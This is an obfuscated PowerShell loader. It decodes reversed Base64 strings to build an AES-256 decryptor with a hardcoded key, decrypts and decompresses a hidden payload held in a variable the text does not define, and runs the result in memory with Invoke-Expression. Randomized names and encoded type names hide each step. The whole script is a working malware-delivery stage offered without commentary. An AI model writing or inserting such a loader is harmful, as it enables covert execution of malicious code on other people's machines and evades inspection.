$srjpnosxihroigt = $sxjitjrpuhomkzxpz.ToCharArray()
[array]::Reverse($srjpnosxihroigt)
$vrtoggxyoukunowpg = -join($srjpnosxihroigt)
$rgmhrrnnkumhktzr = [System.Convert]::FromBase64String("$vrtoggxyoukunowpg")
$jnuywqzkmnji = [System.Convert]::FromBase64String("MxJpqT8XyLz7rQcDaSrYe7VXrJqkoEp9WjfOldiGnWI=")
$nrorrtktkvkh = "==gCkV2Zh5WYNNXZB5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3U"
$jiooivnrnon = $nrorrtktkvkh.ToCharArray()
[array]::Reverse($jiooivnrnon)
$uyuixsrvkxjokzguo = -join($jiooivnrnon)
$nkomonukpvxjjo = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($uyuixsrvkxjokzguo))
$kooqhhprgqkxns = New-Object "$nkomonukpvxjjo"
$nkjzxrhmmururmr = "==gQDVkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"
$quqpkjspjtmxw = $nkjzxrhmmururmr.ToCharArray()
[array]::Reverse($quqpkjspjtmxw)
$ggpvntqyjuhk = -join($quqpkjspjtmxw)
$ikxwjqmtuivr = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ggpvntqyjuhk))
$jgzthwqihxghu = & ([scriptblock]::Create($ikxwjqmtuivr))
$kooqhhprgqkxns.Mode = $jgzthwqihxghu
$jxkujsukkopgr = "==gNyEDMx80UJpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"
$oyhiphjhvrutqm = $jxkujsukkopgr.ToCharArray()
[array]::Reverse($oyhiphjhvrutqm)
$tzoqpkktqtz = -join($oyhiphjhvrutqm)
$ypywzrntmq = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($tzoqpkktqtz))
$grjgyhizhujtoyhvm = & ([scriptblock]::Create($ypywzrntmq))
$kooqhhprgqkxns.Padding = $grjgyhizhujtoyhvm
$kooqhhprgqkxns.BlockSize = 128
$kooqhhprgqkxns.KeySize = 256
$kooqhhprgqkxns.Key = $jnuywqzkmnji
$kooqhhprgqkxns.IV = $rgmhrrnnkumhktzr[0..15]
$qnqiqsnormzqyxrqk = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLk1lbW9yeVN0cmVhbQ=="))
$wmowpkhhpss = New-Object $qnqiqsnormzqyxrqk(,$kooqhhprgqkxns.CreateDecryptor().TransformFinalBlock($rgmhrrnnkumhktzr,16,$rgmhrrnnkumhktzr.Length-16))
$wiurknzjkxzikupz = New-Object $qnqiqsnormzqyxrqk
$ntgqshrnynri = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLkNvbXByZXNzaW9uLkRlZmxhdGVTdHJlYW0="))
$urrypuiuygmnnmzzx = New-Object $ntgqshrnynri $wmowpkhhpss, ([IO.Compression.CompressionMode]::Decompress)
$urrypuiuygmnnmzzx.CopyTo($wiurknzjkxzikupz)
$urrypuiuygmnnmzzx.Close()
$kooqhhprgqkxns.Dispose()
$wmowpkhhpss.Close()
$pvrhtpxogxukxju = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5UZXh0LkVuY29kaW5nXQ=="))))
$oynkyggmnspm = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VVRGOA=="))
$qnqiqsnormzqyxrqk = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9BcnJheQ=="))
$ntgqshrnynri = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0U3RyaW5n"))
$hkkjtputmvij = $pvrhtpxogxukxju::$oynkyggmnspm.$ntgqshrnynri($wiurknzjkxzikupz.$qnqiqsnormzqyxrqk())
IEX($hkkjtputmvij)